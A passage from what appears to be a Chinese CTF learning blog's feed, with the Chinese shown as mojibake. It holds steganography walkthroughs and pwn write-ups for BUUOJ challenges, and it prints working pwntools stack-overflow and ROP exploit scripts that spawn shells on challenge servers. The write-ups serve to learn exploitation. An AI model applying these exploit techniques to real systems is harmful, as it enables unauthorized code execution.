class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">&#x27;bof&#x27;</span>)</span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">ppp_ret = <span class="number">0x08048619</span> <span class="comment"># ROPgadget --binary bof --only &quot;pop|ret&quot;ï¼Œä½œç”¨æ˜¯å°†readçš„å‚æ•°å¼¹å‡ºæ¢å¤å †æ ˆ</span></span><br><span class="line">pop_ebp_ret = <span class="number">0x0804861b</span></span><br><span class="line">leave_ret = <span class="number">0x08048458</span> <span class="comment"># ROPgadget --binary bof --only &quot;leave|ret&quot;</span></span><br><span class="line">stack_size = <span class="number">0x800</span></span><br><span class="line">bss_addr = <span class="number">0x0804a040</span> <span class="comment"># readelf -S bof | grep &quot;.bss&quot;</span></span><br><span class="line">base_stage = bss_addr + stack_size</span><br><span class="line">r = process(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line"><span class="comment"># payload1</span></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span> * offset</span><br><span class="line">payload += p32(read_plt) <span class="comment"># è¯»100ä¸ªå­—èŠ‚åˆ°base_stage</span></span><br><span class="line">payload += p32(ppp_ret)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(base_stage)</span><br><span class="line">payload += p32(<span class="number">100</span>)</span><br><span class="line">payload += p32(pop_ebp_ret) <span class="comment"># æŠŠbase_stage popåˆ°ebpä¸­</span></span><br><span class="line">payload += p32(base_stage)</span><br><span class="line">payload += p32(leave_ret) <span class="comment"># mov esp, ebp ; pop ebp ;å°†espæŒ‡å‘base_stage</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">payload2 = <span class="string">&#x27;AAAA&#x27;</span> <span class="comment"># å› ä¸ºå‰é¢leave_retä»¥åespä¼šæŒ‡å‘base_stageä¸‹ä¸€åœ°å€ï¼Œæ‰€ä»¥è¿™é‡Œç”¨æ— ç”¨å­—ç¬¦å¡«å……</span></span><br><span class="line">payload2 += p32(write_plt)</span><br><span class="line">payload2 += <span class="string">&#x27;AAAA&#x27;</span></span><br><span class="line">payload2 += p32(<span class="number">1</span>)</span><br><span class="line">payload2 += p32(base_stage + <span class="number">80</span>)</span><br><span class="line">payload2 += p32(<span class="built_in">len</span>(cmd))</span><br><span class="line">payload2 += <span class="string">&#x27;A&#x27;</span> * (<span class="number">80</span> - <span class="built_in">len</span>(payload2))</span><br><span class="line">payload2 += cmd + <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">payload2 += <span class="string">&#x27;A&#x27;</span> * (<span class="number">100</span> - <span class="built_in">len</span>(payload2))</span><br><span class="line">r.sendline(payload2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>payload 1=  â€˜Aâ€™ * offset+p32(read_plt)+p32(ppp_ret)+p32(0) +p32(base_stage) +p32(100)ï¼š</p><p>p32(read_plt)+p32(ppp_ret)+p32(0) +p32(base_stage) +p32(100)æ„é€ å‡½æ•°read(0,base_stage,100)ä½œç”¨æ˜¯å‘æˆ‘ä»¬ä¼ªé€ æ•°æ®çš„åœ°æ–¹å†™å…¥æ•°æ®</p>]]></content>
      
      
      <categories>
          
          <category> å­¦ä¹ è®°å½• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUU misc</title>
      <link href="/post/BUU-MISC.html"/>
      <url>/post/BUU-MISC.html</url>
      
        <content type="html"><![CDATA[<h1 id="é‡‘ä¸‰èƒ–"><a href="#é‡‘ä¸‰èƒ–" class="headerlink" title="é‡‘ä¸‰èƒ–"></a>é‡‘ä¸‰èƒ–</h1><p>ä¸‹è½½é™„ä»¶ï¼Œæ‰“å¼€æ˜¯gifï¼Œä»”ç»†çœ‹å‘ç°gifä¼šé—ªç°ä¸€äº›å­—ç¬¦ï¼Œé€šè¿‡åˆ©ç”¨Stegsolveæˆ–è€…PSé€å¸§åˆ†æåˆå¹¶å°±å¯å¾—åˆ°flag</p><p><img src="https://i.loli.net/2021/05/31/ZtEXme1fY8UwHIh.png" alt="image.png"></p><h1 id="äºŒç»´ç "><a href="#äºŒç»´ç " class="headerlink" title="äºŒç»´ç "></a>äºŒç»´ç </h1><p>åœ¨çº¿æ‰«ç ï¼Œå¾—åˆ°secret is here<img src="https://i.loli.net/2021/05/31/Epm1lNvPsoIa8Xj.png" alt="image.png"></p><p>ç”¨winhexæ‰“å¼€å‘ç°å›¾ç‰‡é‡Œé¢è—äº†å‹ç¼©åŒ…ï¼Œå‹ç¼©åŒ…é‡Œé¢æœ‰ä¸€ä¸ª4number.txtæ–‡ä»¶<img src="https://i.loli.net/2021/05/31/a7PysrT9jidQIxD.png" alt="image.png"></p><p>åˆ©ç”¨binwalkåˆ†ç¦»å¾—åˆ°ä¸€ä¸ªåŠ å¯†çš„æ–‡ä»¶ï¼Œ4numberåº”è¯¥æ˜¯æç¤ºï¼Œæç¤ºå¯†ç åªæœ‰å››ä½æ•°ï¼Œç›´æ¥çˆ†ç ´å¾—åˆ°å¯†ç ï¼Œæ‰“å¼€flag<img src="https://i.loli.net/2021/05/31/8gVBjHrO3ZCDJqy.png" alt="image.png"></p><h1 id="Nç§æ–¹æ³•è§£å†³"><a href="#Nç§æ–¹æ³•è§£å†³" class="headerlink" title="Nç§æ–¹æ³•è§£å†³"></a>Nç§æ–¹æ³•è§£å†³</h1><p>é™„ä»¶æ˜¯exeæ–‡ä»¶ï¼Œæ— æ³•ç›´æ¥è¿è¡Œï¼Œæ‹–è¿›winhexé‡Œé¢å‘ç°æ˜¯åå…­è¿›åˆ¶æ˜¯base64ç¼–ç çš„å›¾ç‰‡ï¼Œè§£ç å¾—åˆ°äºŒç»´ç ï¼Œæ‰«ç å¾—åˆ°flag<img src="https://i.loli.net/2021/05/31/F2RNhSZXUWYTDt4.png" alt="image.png"></p><h1 id="å¤§ç™½"><a href="#å¤§ç™½" class="headerlink" title="å¤§ç™½"></a>å¤§ç™½</h1><p>é¢˜ç›®ç»™äº†æç¤ºï¼Œæ˜¯ä¸æ˜¯å±å¹•å¤ªå°äº†ï¼Œå†çœ‹çœ‹é™„ä»¶ï¼Œå‘ç°é«˜åº¦æ˜æ˜¾æœ‰é—®é¢˜ï¼Œç›´æ¥ä¿®æ”¹é«˜åº¦å¾—åˆ°flag<img src="https://i.loli.net/2021/05/31/PFhSz3gIAQYWTVy.png" alt="image.png"></p><h1 id="ä½ ç«Ÿç„¶èµ¶æˆ‘èµ°"><a href="#ä½ ç«Ÿç„¶èµ¶æˆ‘èµ°" class="headerlink" title="ä½ ç«Ÿç„¶èµ¶æˆ‘èµ°"></a>ä½ ç«Ÿç„¶èµ¶æˆ‘èµ°</h1><p>ç­¾åˆ°é¢˜ï¼Œå°†é™„ä»¶æ‹–è¿›winhexï¼Œåœ¨æœ€ä¸‹é¢å‘ç°flag</p><h1 id="åŸºç¡€ç ´è§£"><a href="#åŸºç¡€ç ´è§£" class="headerlink" title="åŸºç¡€ç ´è§£"></a>åŸºç¡€ç ´è§£</h1><p>æç¤ºå¯†ç æ˜¯å››ä½æ•°ï¼Œç›´æ¥çˆ†ç ´ï¼Œå¾—åˆ°å¯†ç ï¼Œæ‰“å¼€å‘ç°å†…å®¹è¢«åŠ å¯†ï¼ŒçŒœæµ‹æ˜¯base64<img src="https://i.loli.net/2021/05/31/GlDCamAKp9hgwrq.png" alt="image.png"></p><p>base64è§£ç å¾—åˆ°flag</p><p><img src="https://i.loli.net/2021/05/31/37SVqiBK9oNsehD.png" alt="image.png"></p><h1 id="ä¹Œé•‡å³°ä¼šç§å›¾"><a href="#ä¹Œé•‡å³°ä¼šç§å›¾" class="headerlink" title="ä¹Œé•‡å³°ä¼šç§å›¾"></a>ä¹Œé•‡å³°ä¼šç§å›¾</h1><p>ç­¾åˆ°é¢˜ï¼Œæ‹–è¿›winhexæ‹‰åˆ°æœ€åº•ä¸‹å°±å¯ä»¥çœ‹åˆ°flag<img src="https://i.loli.net/2021/05/31/wyGEb3q8SR9fsNC.png" alt="image.png"></p><h1 id="LSB"><a href="#LSB" class="headerlink" title="LSB"></a>LSB</h1><p>æ ¹æ®é¢˜ç›®åï¼Œ<strong>LSB</strong>ï¼ˆLeast Significant Bitï¼‰ï¼Œæ„ä¸ºæœ€ä½æœ‰æ•ˆä½ï¼›<strong>MSB</strong>ï¼ˆMost Significant Bitï¼‰ï¼Œæ„ä¸ºæœ€é«˜æœ‰æ•ˆä½ã€‚ä½¿ç”¨Stegsolve<img src="https://i.loli.net/2021/05/31/c5A3vWR4oG8rhdN.png" alt="image.png"></p><p>ä¿å­˜ï¼Œå‘ç°æ˜¯ä¸€ä¸ªäºŒç»´ç ï¼Œæ‰«ç å¾—åˆ°flag</p><h1 id="æ–‡ä»¶ä¸­çš„ç§˜å¯†"><a href="#æ–‡ä»¶ä¸­çš„ç§˜å¯†" class="headerlink" title="æ–‡ä»¶ä¸­çš„ç§˜å¯†"></a>æ–‡ä»¶ä¸­çš„ç§˜å¯†</h1><p>æ‹–è¿›winhexï¼Œä½¿ç”¨binwalkæ²¡æœ‰å‘ç°ä»€ä¹ˆä¸œè¥¿ï¼Œæ‰“å¼€ç…§ç‰‡å±æ€§é‡Œé¢å‘ç°å¤‡æ³¨æœ‰flag<img src="https://i.loli.net/2021/05/31/RyiONSDtKWF62Ap.png" alt="image.png"></p><h1 id="rar"><a href="#rar" class="headerlink" title="rar"></a>rar</h1><p>æ ¹æ®æç¤ºçˆ†ç ´ï¼Œå¾—åˆ°å¯†ç æ‰“å¼€å°±æ˜¯flag</p><p><img src="https://i.loli.net/2021/05/31/P6Lf4htqcjn2sSx.png" alt="image.png"></p><h1 id="qr"><a href="#qr" class="headerlink" title="qr"></a>qr</h1><p>ç­¾åˆ°é¢˜ï¼Œæ‰«ç å¾—åˆ°flag</p><h1 id="zipä¼ªåŠ å¯†"><a href="#zipä¼ªåŠ å¯†" class="headerlink" title="zipä¼ªåŠ å¯†"></a>zipä¼ªåŠ å¯†</h1><p>çœ‹åå­—å°±çŸ¥é“æ˜¯ä¼ªåŠ å¯†ï¼Œæ‹–è¿›winhexï¼Œä¿®æ”¹åç›´æ¥æ‰“å¼€å°±èƒ½å¾—åˆ°flag<img src="https://i.loli.net/2021/06/01/FRcYDGbkQBosrCX.png" alt="image.png"></p><h1 id="ningen"><a href="#ningen" class="headerlink" title="ningen"></a>ningen</h1><p>å°†æ–‡ä»¶ä¸¢è¿›winhexï¼Œæ‹–åˆ°æœ€åå¯ä»¥çœ‹åˆ°ç…§ç‰‡é‡Œé¢è—äº†å‹ç¼©åŒ…ï¼Œè¿˜æœ‰ä¸€ä¸ªtxtæ–‡ä»¶<img src="https://i.loli.net/2021/06/01/eojuyRpP7OiG2Wc.png" alt="image.png"></p><p>ç›´æ¥ä¿®æ”¹åç¼€åï¼Œå‘ç°ä¸€ä¸ªåŠ å¯†txtæ–‡ä»¶ï¼Œæ ¹æ®é¢˜ç›®æç¤ºçˆ†ç ´å¾—åˆ°å¯†ç ï¼Œæ‰“å¼€æ–‡ä»¶å¾—åˆ°flag<img src="https://i.loli.net/2021/06/01/TMgPCG619qeyc3h.png" alt="image.png"></p><h1 id="é•œå­é‡Œé¢çš„ä¸–ç•Œ"><a href="#é•œå­é‡Œé¢çš„ä¸–ç•Œ" class="headerlink" title="é•œå­é‡Œé¢çš„ä¸–ç•Œ"></a>é•œå­é‡Œé¢çš„ä¸–ç•Œ</h1><p>ä½¿ç”¨winhexæ²¡æœ‰å‘ç°ä»€ä¹ˆä¸œè¥¿ï¼Œçœ‹åˆ°æ–‡ä»¶åç›²çŒœä½¿ç”¨<strong>Stegsolve</strong>ä¿®æ”¹æœ€ä½æœ‰æ•ˆä½ï¼Œæœç„¶ï¼Œå¾—åˆ°flag<img src="https://i.loli.net/2021/06/01/I5mDvbVouFsScM2.png" alt="image.png"></p><h1 id="å°æ˜çš„ä¿é™©ç®±"><a href="#å°æ˜çš„ä¿é™©ç®±" class="headerlink" title="å°æ˜çš„ä¿é™©ç®±"></a>å°æ˜çš„ä¿é™©ç®±</h1><p>æ‹–è¿›winhexï¼Œåœ¨æ–‡ä»¶æœ€åå‘ç°æœ‰ä¸ª2.txtæ–‡ä»¶ï¼ŒçŒœæµ‹é‡Œé¢è—äº†å‹ç¼©åŒ…ï¼Œä½¿ç”¨binwalkåˆ†ç¦»ï¼Œå¾—åˆ°å‹ç¼©åŒ…<img src="https://i.loli.net/2021/06/01/4l3ZFYtepU6azSI.png" alt="image.png"></p><p>æ ¹æ®æç¤ºè¿›è¡Œçˆ†ç ´å¾—åˆ°flag<img src="https://i.loli.net/2021/06/01/QHAnOD1pta6ld9o.png" alt="image.png"></p><h1 id="çˆ±å› æ–¯å¦"><a href="#çˆ±å› æ–¯å¦" class="headerlink" title="çˆ±å› æ–¯å¦"></a>çˆ±å› æ–¯å¦</h1><p>æ‹–è¿›winhexï¼Œå‘ç°é‡Œé¢è—æœ‰å‹ç¼©åŒ…ï¼Œç›´æ¥æ”¹åç¼€åï¼Œå°è¯•äº†ä¸€ä¸‹ï¼Œå‘ç°ä¸æ˜¯ä¼ªåŠ å¯†ï¼Œè¿”å›ç…§ç‰‡æŸ¥çœ‹ï¼Œåœ¨å±æ€§å¤‡æ³¨é‡Œé¢å‘ç°å¯†ç ï¼Œæ”¹æˆzipå°±å¯ä»¥çœ‹åˆ°flagäº†</p>]]></content>
      
      
      <categories>
          
          <category> åˆ·é¢˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUU pwn</title>
      <link href="/post/BUU-PWN.html"/>
      <url>/post/BUU-PWN.html</url>
      
        <content type="html"><![CDATA[<h1 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h1><p>æ ˆæº¢å‡ºæŒ‡çš„æ˜¯ç¨‹åºå‘æ ˆä¸­æŸä¸ªå˜é‡ä¸­å†™å…¥çš„å­—èŠ‚æ•°è¶…è¿‡äº†è¿™ä¸ªå˜é‡æœ¬èº«æ‰€ç”³è¯·çš„å­—èŠ‚æ•°ï¼Œå› è€Œå¯¼è‡´ä¸å…¶ç›¸é‚»çš„æ ˆä¸­çš„å˜é‡çš„å€¼è¢«æ”¹å˜ã€‚è¿™ç§é—®é¢˜æ˜¯ä¸€ç§ç‰¹å®šçš„ç¼“å†²åŒºæº¢å‡ºæ¼æ´ï¼Œç±»ä¼¼çš„è¿˜æœ‰å †æº¢å‡ºï¼Œbss æ®µæº¢å‡ºç­‰æº¢å‡ºæ–¹å¼ã€‚æ ˆæº¢å‡ºæ¼æ´è½»åˆ™å¯ä»¥ä½¿ç¨‹åºå´©æºƒï¼Œé‡åˆ™å¯ä»¥ä½¿æ”»å‡»è€…æ§åˆ¶ç¨‹åºæ‰§è¡Œæµç¨‹ã€‚æ­¤å¤–ï¼Œæˆ‘ä»¬ä¹Ÿä¸éš¾å‘ç°ï¼Œå‘ç”Ÿæ ˆæº¢å‡ºçš„åŸºæœ¬å‰ææ˜¯</p><ul><li>ç¨‹åºå¿…é¡»å‘æ ˆä¸Šå†™å…¥æ•°æ®ã€‚</li><li>å†™å…¥çš„æ•°æ®å¤§å°æ²¡æœ‰è¢«è‰¯å¥½åœ°æ§åˆ¶ã€‚</li></ul><h1 id="rip"><a href="#rip" class="headerlink" title="rip"></a>rip</h1><h2 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p>é¦–å…ˆæŸ¥çœ‹é™„ä»¶ï¼Œå‘ç°æ²¡å¼€ä»€ä¹ˆä¿æŠ¤ï¼Œä¸¢è¿›IDAé‡Œé¢çœ‹ä¸€ä¸‹</p><p><img src="https://i.loli.net/2021/05/23/vPpXGYRlquMrOWh.png" alt="image.png"></p><p>å‘ç°å¯ç–‘å‡½æ•°ï¼ˆfunï¼‰ï¼Œç‚¹è¿›å»å¯ä»¥å‘ç°å‡½æ•°è°ƒç”¨äº†/bin/shï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªå‡½æ•°å¾—åˆ°flag<img src="https://i.loli.net/2021/05/23/Gzj4Jyef3P9tLq2.png" alt="image.png"></p><p>å¼€å§‹è°ƒè¯•ã€‚é¦–å…ˆåˆ›é€ ä¸€ä¸ªé•¿åº¦ä¸º150çš„å­—ç¬¦ä¸²ï¼Œè¿è¡Œè¯¥é™„ä»¶ï¼Œå°†é‚£ä¸ªå­—ç¬¦ä¸²è¾“å…¥è¿›å»<img src="https://i.loli.net/2021/05/23/WvfGUnBq1NhFZjQ.png" alt="image.png"></p><p>ä¹‹åç¨‹åºç›´æ¥æŠ¥é”™ï¼Œå› ä¸ºreturnåœ°å€å¤„ä¸æ˜¯ä¸€ä¸ªæ­£ç¡®çš„åœ°å€å€¼ï¼Œæ— æ³•è·³è½¬ã€‚é€šè¿‡returnçš„é‚£ä¸ªåœ°å€å€¼ï¼Œæˆ‘ä»¬å¯ä»¥è®¡ç®—returnè·ç¦»è¾“å…¥ç‚¹çš„é•¿åº¦ã€‚ä½¿ç”¨cyclicè®¡ç®—åç§»é‡<img src="https://i.loli.net/2021/05/23/odKI89vOWRDAuEZ.png" alt="image.png"></p><p>å¾—åˆ°åç§»é‡å°±å¯ä»¥å†™expäº†</p><h2 id="ç¼–å†™EXP"><a href="#ç¼–å†™EXP" class="headerlink" title="ç¼–å†™EXP"></a>ç¼–å†™EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28652</span>)</span><br><span class="line">fun = <span class="number">0x401186</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">23</span>+p64(fun+<span class="number">1</span>)  //å¹³è¡¡å †æ ˆ</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a>warmup_csaw_2016</h1><h2 id="æ€è·¯-1"><a href="#æ€è·¯-1" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p>ä¹Ÿæ˜¯ä¸€ä¸ªç®€å•çš„æ ˆæº¢å‡ºï¼Œæ€è·¯è¿˜æ˜¯ä¸€æ ·çš„ï¼Œå…ˆæŸ¥çœ‹ä¿æŠ¤ï¼Œè¿˜æ˜¯ä»€ä¹ˆä¿æŠ¤éƒ½æ²¡æœ‰å¼€<img src="https://i.loli.net/2021/05/24/rCDanMEpmvbN28R.png" alt="image.png"></p><p>ä¸¢è¿›IDAæŸ¥çœ‹ï¼Œå°±æ˜¯è¾“å‡ºä¸¤ä¸ªè¯­å¥å’Œä¸€ä¸ªå‡½æ•°åœ°å€ï¼ŒæŸ¥çœ‹å‡½æ•°ï¼Œå‘ç°æ˜¯æ‰“å¼€flagæ–‡ä»¶ã€‚æ€è·¯ç«‹åˆ»å°±æœ‰äº†ï¼Œå› ä¸ºæ˜¯getså‡½æ•°æ²¡æœ‰é™åˆ¶è¾“å…¥ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡æ ˆæº¢å‡ºæ¥è·å¾—flagã€‚æ‰€ä»¥ï¼Œæ¥ä¸‹æ¥è¦è®¡ç®—åç§»é‡<img src="https://i.loli.net/2021/05/24/bA1kDTgImdNEpc2.png" alt="image.png"></p><p>è¿˜æ˜¯å’Œä¸Šé¢ä¸€é¢˜ä¸€æ ·çš„æ–¹æ³•è®¡ç®—åç§»é‡</p><p><img src="https://i.loli.net/2021/05/24/1oBRpDXmTdVPvru.png" alt="image.png"></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26972</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0x40060D</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h1><h2 id="æ€è·¯-2"><a href="#æ€è·¯-2" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p>æ£€æŸ¥å¼€äº†ä»€ä¹ˆä¿æŠ¤ï¼Œå‘ç°åªå¼€äº†NXï¼Œå…¶å®ƒæ²¡æœ‰å¼€ï¼Œä¹Ÿå°±æ˜¯æ•°æ®æ®µä¸å¯æ‰§è¡Œ<img src="https://i.loli.net/2021/05/25/smzhw5ZEVCYNP4W.png" alt="image.png"></p><p>æ‰”è¿›IDAæŸ¥çœ‹ï¼Œä¹Ÿå°±æ˜¯è°ƒç”¨äº†funcå‡½æ•°ï¼Œç‚¹è¿›funcå‡½æ•°ï¼Œå‡½æ•°å…ˆæ˜¯å°†ç”¨æˆ·è¾“å…¥çš„å€¼èµ‹äºˆç»™v1ï¼Œä¹‹ååˆ¤æ–­v2æ˜¯å¦ç­‰äº11.28125ï¼Œå¦‚æœç­‰äºå°±å¯ä»¥å¾—åˆ°flagï¼Œæ‰€ä»¥æ€è·¯å°±æ˜¯è®¡ç®—v1å’Œv2ç›¸å·®å¤šå°‘ï¼Œå†åˆ©ç”¨getså‡½æ•°å°†v2è¦†ç›–ä¸º11.28125<img src="https://i.loli.net/2021/05/25/wFnCVTSrxtgHf2i.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/05/25/nxwgLFy6OBIJueS.png" alt="image.png"></p><p>å› ä¸º11.28125åœ¨å†…å­˜ä¸­æ˜¯ä»¥åå…­è¿›åˆ¶å­˜å‚¨ï¼Œæ‰€ä»¥è¦å°†11.28125è½¬æˆåå…­è¿›åˆ¶</p><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">25675</span>)</span><br><span class="line">payload = â€˜a<span class="string">&#x27; *(0x30-0x4) + p64(0x41348000)</span></span><br><span class="line"><span class="string">p.sendline(payload)</span></span><br><span class="line"><span class="string">p.interactive()</span></span><br></pre></td></tr></table></figure><h1 id="pwn1-sctf-2016"><a href="#pwn1-sctf-2016" class="headerlink" title="pwn1_sctf_2016"></a>pwn1_sctf_2016</h1><p>è¿›å…¥IDAå‘ç°å­˜åœ¨åé—¨å‡½æ•°å’Œfgetså‡½æ•°ï¼Œä¸è¿‡fgetså‡½æ•°é™åˆ¶äº†é•¿åº¦ï¼Œè¿™ä¸ªé•¿åº¦æ— æ³•é€ æˆæº¢å‡ºã€‚ä½†æ˜¯åœ¨åé¢å‘ç°std::string::stringå‡½æ•°ï¼Œè™½ç„¶ä¸çŸ¥é“æ˜¯å¹²ä»€ä¹ˆçš„ä½†æ˜¯æ ¹æ®åç§°çŒœæµ‹å¯èƒ½æ˜¯ç”±æŸå­—ç¬¦ä¸²è½¬å˜æˆå¦ä¸€å­—ç¬¦ä¸²</p><p><img src="https://i.loli.net/2021/10/18/JxoN8SInPAMjXil.png" alt="å±å¹•æˆªå›¾ 2021-10-18 200913.png"></p><p>è¿›å…¥gdbè°ƒè¯•ï¼Œå‘ç°è¾“å…¥çš„Iç»è¿‡std::string::stringå‡½æ•°ä¼šè½¬å˜æˆyouï¼Œæ¢å¥è¯è¯´ä¹Ÿå°±æ˜¯1å’Œå­—ç¬¦è½¬æˆ3ä¸ªå­—ç¬¦ï¼Œè€Œè¦é€ æˆæ ˆæº¢å‡ºéœ€è¦0x3cå¦‚æœé€šè¿‡è½¬åŒ–å¯ä»¥è¾¾åˆ°è¦æ±‚ï¼Œä¹Ÿå°±æ˜¯éœ€è¦20ä¸ªâ€™Iâ€™</p><p><img src="https://i.loli.net/2021/10/18/CcGNzTIEBi6pae2.png" alt="å±å¹•æˆªå›¾ 2021-10-18 201902.png"></p><p>ä¹‹åå°±å¾ˆç®€å•äº†ï¼Œé€šè¿‡è½¬æ¢é€ æˆæ ˆæº¢å‡ºï¼Œè·³è½¬åˆ°åé—¨å‡½æ•°è·å–shell</p><h2 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn1_sctf_2016&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26513</span>)</span><br><span class="line">get_shell = <span class="number">0x8048F13</span></span><br><span class="line">payload1 = <span class="string">&#x27;I&#x27;</span>*<span class="number">20</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>+p32(get_shell)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/18/PKQuUJaveh5cE8n.png" alt="image.png"></p><h1 id="jarvisoj-level0"><a href="#jarvisoj-level0" class="headerlink" title="jarvisoj_level0"></a>jarvisoj_level0</h1><p>ç®€å•çš„æ ˆæº¢å‡ºï¼Œç›´æ¥ä¸Šexp</p><h2 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./level0&#x27;</span>)</span><br><span class="line">get_shell = <span class="number">0x40059A</span></span><br><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(get_shell)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h1><p>ä½¿ç”¨IDAæ‰“å¼€ï¼Œåœ¨åŠ å¯†å‡½æ•°ä¸­å­˜åœ¨å±é™©å‡½æ•°getsï¼Œå¯ä»¥é€ æˆæ ˆæº¢å‡ºã€‚å› ä¸ºæ²¡æœ‰systemä»¥åŠbin/shå­—ç¬¦ä¸²ï¼Œæ‰€ä»¥é‡‡å–libcæ³„éœ²æ¥åšæ­¤é¢˜</p><p><img src="https://i.loli.net/2021/10/18/dpC6UmnwKf4E7Il.png" alt="å±å¹•æˆªå›¾ 2021-10-18 193913.png"></p><p>æ‰€ä»¥åŸºæœ¬æ€è·¯å°±æ˜¯è¿è¡Œä¸¤æ¬¡ï¼Œå…ˆæ³„éœ²å‡½æ•°åœ°å€è·å¾—libcï¼Œè®¡ç®—å¾—åˆ°systemå‡½æ•°å’Œbin/shå­—ç¬¦ä¸²åœ°å€ï¼Œç¬¬äºŒæ¬¡è¿è¡Œæ‰§è¡Œsystemå‡½æ•°è·å¾—shell</p><p>payload1:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload1=<span class="string">&quot;A&quot;</span>*<span class="number">88</span>+p64(pop_rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(start_addr)</span><br></pre></td></tr></table></figure><p>payload2:</p><figure 